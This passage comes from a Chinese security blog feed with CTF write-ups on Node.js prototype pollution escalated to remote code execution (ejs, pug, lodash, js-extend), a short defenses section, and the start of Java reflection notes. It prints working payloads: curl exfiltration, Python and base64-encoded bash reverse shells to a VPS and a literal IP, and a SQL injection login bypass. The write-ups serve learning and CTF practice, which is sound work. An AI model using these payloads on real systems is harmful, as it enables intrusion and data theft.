&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Access-Control-Allow-Headers&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;X-Requested-With, crossDomain&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://github.com/NeSE-Team/XNUCA2020Qualifier/tree/main/Web/oooooooldjs">详细的exp&amp;amp;docker见官方仓库&lt;/a>&lt;/p>
&lt;h6 id="关于任意原型链污染">关于任意原型链污染&lt;/h6>
&lt;p>由于出题人加了个json的中间件允许传入object，导致可以做到任意污染（这下格局打开了）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">&amp;#34;block&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">123&lt;/span>&lt;span style="color:#111">}},&lt;/span> &lt;span style="color:#f92672">&amp;#34;block\&amp;#34;].__proto__[\&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">123&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="安洵杯-2020validator">[安洵杯 2020]Validator&lt;/h5>
&lt;p>&lt;a href="https://xz.aliyun.com/t/8581#toc-2">https://xz.aliyun.com/t/8581#toc-2&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">password&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;D0g3_Yes!!!&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">system_open&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">system_open&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;yes&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/flag&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">200&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">400&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;The login is successful, but the system is under test and not open...&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">400&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Login Fail, Password Wrong!&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>利用上面任意原型链污染的点来使&lt;code>info.system_open&lt;/code>为真&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;D0g3_Yes!!!&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">&amp;#34;system_open&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;yes&amp;#34;&lt;/span>&lt;span style="color:#111">}},&lt;/span> &lt;span style="color:#f92672">&amp;#34;a\&amp;#34;].__proto__[\&amp;#34;system_open&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;yes&amp;#34;&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="巅峰极客-2021ezjs">[巅峰极客 2021]ezjs&lt;/h5>
&lt;p>&lt;a href="https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#toc-heading-5">https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#toc-heading-5&lt;/a>&lt;/p>
&lt;p>不过这里不能直接传json，用urlencode&lt;/p>
&lt;pre tabindex="0">&lt;code>username=amiz&amp;amp;password=amiz&amp;amp;&amp;#34;].__proto__[&amp;#34;isadmin=amiz&amp;amp;&amp;#34;].__proto__[&amp;#34;debug=amiz
&lt;/code>&lt;/pre>&lt;p>所以就不需要反斜杠什么的去转义json了&lt;/p>
&lt;p>污染admin和debug之后成为用admin的cookie打pug的getshell，有CVE-2021-21353&lt;/p>
&lt;pre tabindex="0">&lt;code>/admin?p=&amp;#39;);process.mainModule.constructor._load(&amp;#39;child_process&amp;#39;).exec(&amp;#39;whoami&amp;#39;);_=(&amp;#39;
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>curl -F &amp;#34;file=`ls -al /|base64`&amp;#34; http://VPS
curl -F &amp;#34;file=`tac /root/flag.txt`&amp;#34; http://VPS
&lt;/code>&lt;/pre>&lt;p>curl外带，或者python shell&lt;/p>
&lt;pre tabindex="0">&lt;code>/admin/?p=&amp;#39;);process.mainModule.constructor._load(&amp;#39;child_process&amp;#39;).exec(&amp;#39;python -c &amp;#34;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&amp;#39;vps\&amp;#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&amp;#39;/bin/bash\&amp;#39;,\&amp;#39;-i\&amp;#39;]);&amp;#34;&amp;#39;);_=(&amp;#39;
&lt;/code>&lt;/pre>&lt;h4 id="ejs316--lodash">ejs(&amp;lt;=3.1.6) + lodash&lt;/h4>
&lt;pre tabindex="0">&lt;code>payload=&amp;#34;ee;return process.mainModule.require(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;cat /flag &amp;amp;&amp;amp; echo successed&amp;#39;).toString();//&amp;#34;
&lt;/code>&lt;/pre>&lt;h5 id="xnuca2019qualifierhardjs">[XNUCA2019Qualifier]HardJS&lt;/h5>
&lt;p>&lt;a href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs">https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs&lt;/a>&lt;/p>
&lt;p>前端和后端分别存在原型污染的漏洞，前端的问题来自于ejs的经典&lt;code>outputFunctionName&lt;/code>（或者&lt;code>escapeFunction&lt;/code>）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220426173627138.png" alt="image-20220426173627138">&lt;/p>
&lt;p>后端的问题来自于lodash.defaultsDeep&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220426173612125.png" alt="image-20220426173612125">&lt;/p>
&lt;p>知道漏洞点了，我们如何利用呢？&lt;/p>
&lt;p>前端的ejs直接弹shell&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#f92672">&amp;#34;content&amp;#34;&lt;/span>&lt;span style="color:#111">:{&lt;/span>&lt;span style="color:#f92672">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">:{&lt;/span>&lt;span style="color:#f92672">&amp;#34;prototype&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">&amp;#34;outputFunctionName&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;a=1;process.mainModule.require(&amp;#39;child_process&amp;#39;).exec(&amp;#39;bash -c \&amp;#34;echo $FLAG&amp;gt;/dev/tcp/101.35.114.107/8426\&amp;#34;&amp;#39;)//&amp;#34;&lt;/span>&lt;span style="color:#111">}}}}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">&amp;#34;prototype&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">&amp;#34;client&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#f92672">&amp;#34;escapeFunction&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;1; return
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">process.env.FLAG&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#f92672">&amp;#34;debug&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">&amp;#34;compileDebug&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">}}}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>[MRCTF 2022]hurry up&lt;/p>
&lt;h4 id="ejs--js-extend">ejs + js-extend&lt;/h4>
&lt;h5 id="gkctf-2021easynode">[GKCTF 2021]easynode&lt;/h5>
&lt;p>一看依赖文件，经典ejs 3.1.5肯定有原型链污染，同时需要别的配合，这里的孤儿选手是js-extend&lt;/p>
&lt;p>首先是绕admin权限的登录，在登录处对用户名和密码进行waf处理&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220426181110393.png" alt="image-20220426181110393">&lt;/p>
&lt;p>用了&lt;code>==&lt;/code>弱比较，并且safeStr用了相加，两个数组相加会得到一个字符串&lt;/p>
&lt;pre tabindex="0">&lt;code>username[]=admin&amp;#39;#&amp;amp;username[]=a&amp;amp;username[]=a&amp;amp;username[]=a&amp;amp;username[]=a&amp;amp;username[]=a&amp;amp;username[]=a&amp;amp;username[]=a&amp;amp;username[]=a&amp;amp;username[]=(&amp;amp;password=123456
&lt;/code>&lt;/pre>&lt;p>这样sql语句会变为&lt;/p>
&lt;pre tabindex="0">&lt;code>select * from test where username = &amp;#39;admin&amp;#39;#,1,1,1,1,1,1,1,1,1*&amp;#39; and password = &amp;#39;123456&amp;#39;
&lt;/code>&lt;/pre>&lt;p>直接注释掉password登录&lt;/p>
&lt;p>得到admin的token之后再到/addAdmin处添加用户（cookie的token字段记得修改）&lt;/p>
&lt;pre tabindex="0">&lt;code>username=__proto__&amp;amp;password=123
&lt;/code>&lt;/pre>&lt;p>/adminDIV处post&lt;/p>
&lt;pre tabindex="0">&lt;code>data={&amp;#34;outputFunctionName&amp;#34;:&amp;#34;_tmp1;global.process.mainModule.require(&amp;#39;child_process&amp;#39;).exec(&amp;#39;echo YmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMDEuMzUuMTE0LjEwNy84NDI2IDA%2BJjEi|base64 -d|bash&amp;#39;);var __tmp2&amp;#34;}
&lt;/code>&lt;/pre>&lt;p>注意一定要b64+urlencode，再次访问/admin触发rce&lt;/p>
&lt;h2 id="防御策略">防御策略&lt;/h2>
&lt;h3 id="冻结原型">冻结原型&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">freeze&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">prototype&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">freeze&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">({}).&lt;/span>&lt;span style="color:#75af00">__proto__&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">test&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">123&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">({}).&lt;/span>&lt;span style="color:#75af00">test&lt;/span> &lt;span style="color:#75715e">// this will be undefined
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="白名单黑名单">白名单/黑名单&lt;/h3>
&lt;p>迭代对象属性，过滤&lt;code>__proto__&lt;/code>和&lt;code>prototype&lt;/code>，还有一些其它的属性&lt;/p>
&lt;h3 id="使用map结构">使用map结构&lt;/h3>
&lt;p>用map数据结构来代替自带的对象结构&lt;/p>
&lt;h3 id="使用create进行防御">使用create进行防御&lt;/h3>
&lt;p>就很nb，它创建好的对象找不到原型链&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">create&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">__proto__&lt;/span> &lt;span style="color:#75715e">// undefined
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span> &lt;span style="color:#75715e">// undefined
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">JavaScript_prototype_pollution_attack_in_NodeJS.pdf&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://whoamianony.top/2021/10/30/Web%E5%AE%89%E5%85%A8/Nodejs%20%E5%B8%B8%E8%A7%81%E6%A8%A1%E5%9D%97%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E4%B8%8E%E5%B8%B8%E8%A7%81%E6%A8%A1%E6%9D%BF%20RCE/">Nodejs 常见模块原型链污染与常见模板污染向 RCE&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://juejin.cn/post/6963950629240733727">前端原型链污染漏洞竟可以拿下服务器shell？&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/NeSE-Team/XNUCA2020Qualifier/blob/main/Web/oooooooldjs/writeup.md">oooooooldjs writeup1&lt;/a> | &lt;a href="https://github.com/NeSE-Team/XNUCA2020Qualifier/blob/main/Web/oooooooldjs/writeup.md">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://juejin.cn/post/6844904030221631495">在JavaScript中实现链式调用&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>Java学习笔记Ⅳ</title><link>https://amiaaaz.github.io/2022/05/04/java-study-notes-04/</link><pubDate>Wed, 04 May 2022 16:03:58 +0800</pubDate><guid>https://amiaaaz.github.io/2022/05/04/java-study-notes-04/</guid><description>&lt;p>p牛安全漫谈学习&lt;/p>
&lt;h2 id="反射">反射&lt;/h2>
&lt;p>关于动态特性，p牛给出了这样的定义&lt;/p>
&lt;blockquote>
&lt;p>一段代码，改变其中的变量，将会导致这段代码产生功能性的变化&lt;/p>
&lt;/blockquote>
&lt;p>PHP的一句话🐎也正是这个特性的体现之一，java虽然没有PHP这么灵活，但是强大的反射功能也可以提供一些动态特性，比如这样的函数&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">execute&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">className&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">methodName&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">className&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">methodName&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">// 执行
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>最终执行的方法根据传入的参数而定&lt;/p>
&lt;h3 id="forname">forName&lt;/h3>
&lt;p>获取一个&lt;code>class&lt;/code>的&lt;code>Class&lt;/code>实例的方式之一是&lt;code>Class.forName&lt;/code>，它有两个函数重载&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#75715e">// 常用
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span>&lt;span style="color:#f92672">**&lt;/span> &lt;span style="color:#111">initialize&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassLoader&lt;/span> &lt;span style="color:#111">loader&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>第一个参数是类名，完整路径（如果可控就可以加载任意类），如果加载内部类可以用&lt;code>Class.forName(&amp;quot;C1$C2&amp;quot;)&lt;/code>&lt;/p>
&lt;p>第三个参数&lt;code>ClassLoader&lt;/code>的作用是告诉JVM如何加载这个类，java默认的&lt;code>ClassLoader&lt;/code>就是根据类名（类完整路径）来加载类&lt;/p>
&lt;p>对于第二个参数，即使我们设置&lt;code>true&lt;/code>，也不会在执行&lt;code>forName&lt;/code>时执行构造函数，因为这里的&lt;code>initialize&lt;/code>指的是类的初始化，调用其中的&lt;code>static&lt;/code>部分代码&lt;/p>
&lt;ul>
&lt;li>
&lt;p>类的实例化(newInstance)：static{} -&amp;gt; {} -&amp;gt; 构造函数&lt;/p>
&lt;/li>
&lt;li>
&lt;p>类的初始化(initial)：static{}&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>由此，如果&lt;code>forName&lt;/code>的参数可控，我们可以编写恶意类（恶意代码位于static中），进而完成对指定类的初始化 触发static{}部分；编写poc&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ref&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">victim&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;ref.exp&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ref&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">exp&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
